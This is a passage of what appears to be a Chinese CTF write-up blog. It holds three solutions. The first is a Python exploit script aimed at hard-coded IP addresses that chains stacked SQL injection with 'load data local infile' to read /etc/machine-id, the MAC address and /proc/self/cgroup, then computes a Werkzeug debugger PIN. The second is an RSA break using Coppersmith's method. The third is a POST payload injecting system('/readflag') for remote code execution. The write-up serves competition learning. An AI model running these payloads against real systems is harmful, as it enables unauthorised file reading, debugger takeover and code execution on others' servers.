class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://124.70.185.87:5002/&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://121.37.153.47:5002/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url = &#x27;http://123.60.72.85:5002/&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&#x27;view?note_id=&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># path = &#x27;/usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py&#x27;</span></span><br><span class="line"><span class="comment"># path =  &#x27;/etc/passwd&#x27;</span></span><br><span class="line">path2 = <span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span></span><br><span class="line">path3 = <span class="string">&#x27;/proc/self/cgroup&#x27;</span></span><br><span class="line"><span class="comment"># path = &#x27;/flag_cantguessit&#x27;</span></span><br><span class="line">path = <span class="string">&#x27;/etc/machine-id&#x27;</span></span><br><span class="line"><span class="comment"># path = &#x27;/proc/sys/kernel/random/boot_id&#x27;</span></span><br><span class="line"><span class="comment"># payload=&quot;0&#x27;union select 1,2,3,4,(select hex(group_concat(cmd))from hua&quot;+time+&quot;)%23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;xiquanmuhua&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;submit&quot;</span>:<span class="string">&quot;Login!&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">ks = requests.session()</span><br><span class="line">    </span><br><span class="line">re1 = ks.post(url=url+<span class="string">&#x27;login&#x27;</span>,data=data)</span><br><span class="line"></span><br><span class="line">time = <span class="built_in">str</span>(time.time()).replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">time2 = time+<span class="string">&#x27;2&#x27;</span></span><br><span class="line"></span><br><span class="line">time3 = time+<span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line">create = <span class="string">&quot;0&#x27;;create table hua&quot;</span>+time+<span class="string">&quot;(cmd text)%23&quot;</span></span><br><span class="line">    </span><br><span class="line">create2 = <span class="string">&quot;0&#x27;;create table hua&quot;</span>+time2+<span class="string">&quot;(cmd text)%23&quot;</span></span><br><span class="line"></span><br><span class="line">create3 = <span class="string">&quot;0&#x27;;create table hua&quot;</span>+time3+<span class="string">&quot;(cmd text)%23&quot;</span></span><br><span class="line"></span><br><span class="line">load = <span class="string">&quot;0&#x27;;load data local infile &#x27;&quot;</span>+path+<span class="string">&quot;&#x27; into table hua&quot;</span>+time+<span class="string">&quot;%23&quot;</span></span><br><span class="line"></span><br><span class="line">load2 = <span class="string">&quot;0&#x27;;load data local infile &#x27;&quot;</span>+path2+<span class="string">&quot;&#x27; into table hua&quot;</span>+time2+<span class="string">&quot;%23&quot;</span></span><br><span class="line"></span><br><span class="line">load3 = <span class="string">&quot;0&#x27;;load data local infile &#x27;&quot;</span>+path3+<span class="string">&quot;&#x27; into table hua&quot;</span>+time3+<span class="string">&quot;%23&quot;</span></span><br><span class="line"></span><br><span class="line">ks.get(url=url+sql+create)</span><br><span class="line"></span><br><span class="line">ks.get(url=url+sql+load)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/machine-id</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    payload=<span class="string">&quot;0&#x27;union select 1,2,3,4,(select cmd from hua&quot;</span>+time+<span class="string">&quot; limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)%23&quot;</span></span><br><span class="line"></span><br><span class="line">    re3 = ks.get(url=url+sql+payload)</span><br><span class="line">    <span class="comment"># if i==41:</span></span><br><span class="line">    <span class="comment">#     print(re3.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if &#x27;None&#x27; in re3.text:</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">    </span><br><span class="line">    line1 = re.findall(<span class="string">&#x27;\s(.*?)\s    \&lt;/h1&#x27;</span>,re3.text)</span><br><span class="line">    cal = line1[<span class="number">0</span>][<span class="number">0</span>:<span class="number">1000</span>]</span><br><span class="line">    <span class="comment"># print(str(i)+cal)</span></span><br><span class="line">    <span class="keyword">if</span> cal==<span class="string">&#x27;        None&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cal = html.unescape(cal)</span><br><span class="line">    cal1 = cal.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(cal.replace(&#x27;:&#x27;,&#x27;&#x27;))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(cal1)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(re3.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /sys/class/net/eth0/address</span></span><br><span class="line">ks.get(url=url+sql+create2)</span><br><span class="line"></span><br><span class="line">ks.get(url=url+sql+load2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    payload=<span class="string">&quot;0&#x27;union select 1,2,3,4,(select cmd from hua&quot;</span>+time2+<span class="string">&quot; limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)%23&quot;</span></span><br><span class="line"></span><br><span class="line">    re3 = ks.get(url=url+sql+payload)</span><br><span class="line">    <span class="comment"># if i==41:</span></span><br><span class="line">    <span class="comment">#     print(re3.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if &#x27;None&#x27; in re3.text:</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">    </span><br><span class="line">    line1 = re.findall(<span class="string">&#x27;\s(.*?)\s    \&lt;/h1&#x27;</span>,re3.text)</span><br><span class="line">    cal = line1[<span class="number">0</span>][<span class="number">0</span>:<span class="number">1000</span>]</span><br><span class="line">    <span class="comment"># print(str(i)+cal)</span></span><br><span class="line">    <span class="keyword">if</span> cal==<span class="string">&#x27;        None&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cal = html.unescape(cal)</span><br><span class="line">    cal = cal.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment"># print(cal)</span></span><br><span class="line">    cal = cal.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    cal2 = <span class="built_in">int</span>(cal,<span class="number">16</span>)</span><br><span class="line">    cal2 = <span class="built_in">str</span>(cal2)</span><br><span class="line">    <span class="comment"># print(cal.replace(&#x27;:&#x27;,&#x27;&#x27;))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(cal2)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(re3.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ks.get(url=url+sql+create3)</span><br><span class="line"></span><br><span class="line">ks.get(url=url+sql+load3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    payload=<span class="string">&quot;0&#x27;union select 1,2,3,4,(select cmd from hua&quot;</span>+time3+<span class="string">&quot; limit &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;,1)%23&quot;</span></span><br><span class="line"></span><br><span class="line">    re3 = ks.get(url=url+sql+payload)</span><br><span class="line">    <span class="comment"># if i==41:</span></span><br><span class="line">    <span class="comment">#     print(re3.text)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># if &#x27;None&#x27; in re3.text:</span></span><br><span class="line">    <span class="comment">#     break</span></span><br><span class="line">    </span><br><span class="line">    line1 = re.findall(<span class="string">&#x27;\s(.*?)\s    \&lt;/h1&#x27;</span>,re3.text)</span><br><span class="line">    cal = line1[<span class="number">0</span>][<span class="number">0</span>:<span class="number">1000</span>]</span><br><span class="line">    <span class="comment"># print(str(i)+cal)</span></span><br><span class="line">    <span class="keyword">if</span> cal==<span class="string">&#x27;        None&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cal = html.unescape(cal)</span><br><span class="line">    cal = cal.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    cal3 = cal.strip().rpartition(<span class="string">&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    <span class="comment"># print(cal.replace(&#x27;:&#x27;,&#x27;&#x27;))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(cal3)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># print(re3.text)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># private_bits = [</span></span><br><span class="line"><span class="comment">#     &#x27;2485723357187&#x27;,# str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line"><span class="comment">#     &#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;# get_machine_id(), /etc/machine-id</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line">private_bits = [</span><br><span class="line">    cal2,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    cal1+cal3<span class="comment">#&#x27;1cc402dd0e11d5ae18db04a6de87223d&#x27;#+&#x27;e86c4117-eed3-4a37-82bc-b5fa47a88e0b&#x27;</span></span><br><span class="line">    <span class="comment">#+&#x27;3701193a45598aa31a77b5a477183ab2b36640ccc522a3dab50a58c7e875ce4d&#x27;# get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(</span><br><span class="line">                num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(probably_public_bits)</span></span><br><span class="line"><span class="comment"># print(private_bits)</span></span><br></pre></td></tr></table></figure>

<h2 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getStrongPrime</span><br><span class="line"><span class="keyword">from</span> gmpy <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p=getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q=next_prime(p^((<span class="number">1</span>&lt;&lt;<span class="number">900</span>)-<span class="number">1</span>)^getrandbits(<span class="number">300</span>))</span><br><span class="line">n=p*q</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line">m=<span class="built_in">int</span>(flag.encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">assert</span> m&lt;n</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(n))</span><br><span class="line"><span class="comment">#0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(c))</span><br><span class="line"><span class="comment">#0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1bea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52ff2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>next_prime方法是获取该数字的接下来的一个质数，而作为一个大数，下一个数与其相差是很小的，因此受到影响的只有低位，而高位是相同的</p>
<p><code>p</code>与<code>p^((1&lt;&lt;900)-1)^getrandbits(300)</code>近似，将p与q都分别拆成高124位和低900位，p的高124位由于在异或时不受到影响，因此与q的高124位也是相等的</p>
<p>并且p的低位与q的低位之和等于<code>1&lt;&lt;900-1+c1</code>，c1是小于300位的随机数与<code>1&lt;&lt;900-1</code>异或后再以此获取到下一位质数的低位时发生的改变量，是一个小数</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n=p*q</span><br><span class="line">n=(phigh*<span class="number">2</span>**<span class="number">900</span>+plow)*(qhigh*<span class="number">2</span>**<span class="number">900</span>+qlow)</span><br><span class="line"><span class="comment"># phigh=qhigh,因此设为x</span></span><br><span class="line">n=(x*<span class="number">2</span>**<span class="number">900</span>+plow)*(x*<span class="number">2</span>*<span class="number">900</span>+qlow)</span><br><span class="line">n=x**<span class="number">2</span>*<span class="number">2</span>**<span class="number">1800</span>+x*<span class="number">2</span>**<span class="number">900</span>*(plow+qlow)+(plow+qlow)</span><br><span class="line"><span class="comment"># (plow+qlow)为小数可忽略不计，计算出x</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">n=<span class="number">0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span></span><br><span class="line">x=sympy.Symbol(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">f1=x**<span class="number">2</span>+x-n//<span class="number">2</span>**<span class="number">1800</span></span><br><span class="line">result=sympy.solve([f1],[x])</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="comment"># a = 20226195070633070235386534147535171929</span></span><br></pre></td></tr></table></figure>
<p>计算出高124位值</p>
<p>接着利用高124位值继续计算原始值，首先由n&#x3D;p*q以及高124位的值爆出pq近似值，<code>1&lt;900-1</code>的1位到900位都是1，而没有与<code>getrandbits(300)</code>进行异或的300位到900位之间，与p异或后，得到的q的每一位必定与p的每一位不同，而且p与q相差越大，n越小，反之相差越小则n越大，而pq高124位相同，从900到300位之间，pq每一位必定不同，因此，此时p越小，则q越大，因此从最高不同位开始对qp进行交换值，爆出300到900位pq小于n的最大值</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n=<span class="number">0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">0xd7f6c90512bc9494370c3955ff3136bb245a6d1095e43d8636f66f11db525f2063b14b2a4363a96e6eb1bea1e9b2cc62b0cae7659f18f2b8e41fca557281a1e859e8e6b35bd114655b6bf5e454753653309a794fa52ff2e79433ca4bbeb1ab9a78ec49f49ebee2636abd9dd9b80306ae1b87a86c8012211bda88e6e14c58805feb6721a01481d1a7031eb3333375a81858ff3b58d8837c188ffcb982a631e1a7a603b947a6984bd78516c71cfc737aaba479688d56df2c0952deaf496a4eb3f603a46a90efbe9e82a6aef8cfb23e5fcb938c9049b227b7f15c878bd99b61b6c56db7dfff43cd457429d5dcdb5fe314f1cdf317d0c5202bad6a9770076e9b25b1</span></span><br><span class="line">a=<span class="number">20226195070633070235386534147535171929</span></span><br><span class="line">p_high=a</span><br><span class="line">p=(p_high&lt;&lt;<span class="number">900</span>)+((<span class="number">1</span>&lt;&lt;<span class="number">900</span>)-<span class="number">1</span>)^((<span class="number">1</span>&lt;&lt;<span class="number">300</span>)-<span class="number">1</span>)</span><br><span class="line">q=p_high&lt;&lt;<span class="number">900</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">898</span>,<span class="number">299</span>,-<span class="number">1</span>):<span class="comment">#爆出pq的近似值</span></span><br><span class="line">        bit=<span class="number">1</span>&lt;&lt;i</span><br><span class="line">        <span class="keyword">if</span> (p^bit)*(q^bit)&lt;n:</span><br><span class="line">                p^=bit</span><br><span class="line">                q^=bit</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;q=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># p=170966211863977623201944075700366958395158791305775637137148430402719914596268969449870561801896130406088025694634815584789789278534177858182071449441084789053688828370314062664371344767976558822028720769455584351917209508431456012727131938700513852456800512509515671651181190792109543581556171983224752308224</span></span><br><span class="line"><span class="comment"># q=170966211863977623201944075700366958393004619503764097699771516857862770135235397782599591014026733542308689997522855822788108026355476250633633402693487971215224188430679737025882985505403822114205661869527054569354756666960892566846657579630600045867463262261396595011080471979623070974104943596771301392384</span></span><br></pre></td></tr></table></figure>
<p>使用coppersmith定理进行高位攻击</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # 把上半段的结果与以下注释部分拿到网站https://sagecell.sagemath.org/去跑</span></span><br><span class="line"><span class="comment"># n=0xe78ab40c343d4985c1de167e80ba2657c7ee8c2e26d88e0026b68fe400224a3bd7e2a7103c3b01ea4d171f5cf68c8f00a64304630e07341cde0bc74ef5c88dcbb9822765df53182e3f57153b5f93ff857d496c6561c3ddbe0ce6ff64ba11d4edfc18a0350c3d0e1f8bd11b3560a111d3a3178ed4a28579c4f1e0dc17cb02c3ac38a66a230ba9a2f741f9168641c8ce28a3a8c33d523553864f014752a04737e555213f253a72f158893f80e631de2f55d1d0b2b654fc7fa4d5b3d95617e8253573967de68f6178f78bb7c4788a3a1e9778cbfc7c7fa8beffe24276b9ad85b11eed01b872b74cdc44959059c67c18b0b7a1d57512319a5e84a9a0735fa536f1b3</span></span><br><span class="line"><span class="comment"># P.&lt;x&gt;=PolynomialRing(Zmod(n))  #对p进一步爆破，直到能用高位攻击为止，得到p</span></span><br><span class="line"><span class="comment"># for i in range(300,500):</span></span><br><span class="line"><span class="comment">#     f=x+((p&gt;&gt;i)&lt;&lt;i)</span></span><br><span class="line"><span class="comment">#     root=f.small_roots(X=2^i,beta=0.4)</span></span><br><span class="line"><span class="comment">#     if root!=[]:</span></span><br><span class="line"><span class="comment">#         p=root[0]+((p&gt;&gt;i)&lt;&lt;i)</span></span><br><span class="line"><span class="comment">#         print(f&quot;p=&#123;p&#125;&quot;)</span></span><br><span class="line"><span class="comment">#         break</span></span><br></pre></td></tr></table></figure>
<p>small_roots方法，参数X是可能解的上限，最高可取值为2的454次方，也就是454位未知时可用，参数beta在p和q非常接近时取0.4即可，但其他时候需要看情况取值，具体说明看文章(RSA中coppersmith定理的应用条件)[<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUxOTk5NzcyL2FydGljbGUvZGV0YWlscy8xMjM2MjA5MzJd">https://blog.csdn.net/qq_51999772/article/details/123620932]</span></p>
<p>得到p即可求出q，接着就是一般解rsa的步骤即可解出：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="comment"># from Crypto.Util.number import long_to_bytes</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = <span class="number">170966211863977623201944075700366958395158791305775637137148430402719914596268969449870561801896130406088025694634815584789789278534177858182071449441084789053688828370314062664371527964357773254659131885022323526864655742577256932209187678896131068422973326545184343697783650940422950445390573562429093050687</span></span><br><span class="line">q = n//p</span><br><span class="line"></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(<span class="built_in">pow</span>(c,d,n))[<span class="number">2</span>:]).decode())</span><br><span class="line"><span class="comment"># *CTF&#123;St.Diana_pls_take_me_with_you!&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="dasctf2022-抗’疫’"><a href="#dasctf2022-抗’疫’" class="headerlink" title="dasctf2022 抗’疫’"></a>dasctf2022 抗’疫’</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>抓包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /?action=TestView</span><br><span class="line"></span><br><span class="line">properties%5Btemplate%5D=%7BTableBody%7D&amp;properties%5BrowHtmlOptionsExpression%5D=system%28&#x27;/readflag&#x27;%29&amp;properties%5Bdata%5D%5B0%5D=1</span><br></pre></td></tr></table></figure>
<p>调用了run方法，run在listview，但这是个抽象类，找到子类testview，然后创建，触发父类run方法，调用回调方法，正则匹配被{}包起来的字符串[A-Za-z]，调用renderSection方法，拼接render和TableBody调用，满足条件rowHtmlOptionsExpression不为空，触发基类的方法，满足data不为空，打进eval，rce</p>
